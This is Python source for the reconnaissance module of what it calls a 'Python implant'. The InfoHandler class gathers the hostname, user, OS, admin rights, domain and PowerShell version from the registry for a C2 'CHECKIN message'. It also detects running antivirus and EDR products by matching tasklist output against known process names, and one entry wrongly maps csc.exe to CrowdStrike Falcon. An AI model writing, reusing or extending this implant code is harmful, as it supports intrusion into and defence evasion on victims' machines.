"""System information collector for the Python implant."""
from __future__ import annotations
import os
import platform
import socket
import sys


class InfoHandler:
    """Collect host reconnaissance data without external dependencies."""

    def collect(self) -> dict:
        """Return a dict of host details usable in the CHECKIN message."""
        info: dict = {
            "hostname":  socket.gethostname(),
            "username":  os.environ.get("USERNAME") or os.environ.get("USER") or "",
            "os":        platform.platform(),
            "arch":      platform.machine(),
            "pid":       os.getpid(),
            "python":    sys.version.split()[0],
            "is_admin":  self._is_admin(),
            "domain":    self._domain(),
            "ps_ver":    self._ps_version(),
            "av":        self._detect_av(),
            "cwd":       os.getcwd(),
        }
        return info

    # ── helpers ───────────────────────────────────────────────────────────

    def _is_admin(self) -> bool:
        if sys.platform == "win32":
            try:
                import ctypes
                return bool(ctypes.windll.shell32.IsUserAnAdmin())
            except Exception:
                return False
        return os.geteuid() == 0

    def _domain(self) -> str:
        if sys.platform == "win32":
            return os.environ.get("USERDOMAIN", "")
        return ""

    def _ps_version(self) -> str:
        """Query PS version without subprocess — read from registry if on Windows."""
        if sys.platform != "win32":
            return ""
        try:
            import winreg
            key = winreg.OpenKey(
                winreg.HKEY_LOCAL_MACHINE,
                r"SOFTWARE\Microsoft\PowerShell\3\PowerShellEngine",
            )
            val, _ = winreg.QueryValueEx(key, "PowerShellVersion")
            return str(val)
        except Exception:
            return ""

    def _detect_av(self) -> list[str]:
        """Quick heuristic: look for known AV/EDR process names in the process list."""
        if sys.platform != "win32":
            return []
        known = {
            "MsMpEng.exe": "Windows Defender",
            "SentinelAgent.exe": "SentinelOne",
            "CylanceSvc.exe": "Cylance",
            "cb.exe": "CarbonBlack",
            "CrowdStrike": "CrowdStrike",
            "bdagent.exe": "Bitdefender",
            "McShield.exe": "McAfee",
            "avp.exe": "Kaspersky",
            "csc.exe": "CrowdStrike Falcon",
        }
        found = []
        try:
            import subprocess
            out = subprocess.check_output(
                ["tasklist", "/fo", "csv", "/nh"],
                stderr=subprocess.DEVNULL,
                timeout=10,
            ).decode(errors="replace")
            for proc_name, av_name in known.items():
                if proc_name.lower() in out.lower() and av_name not in found:
                    found.append(av_name)
        except Exception:
            pass
        return found
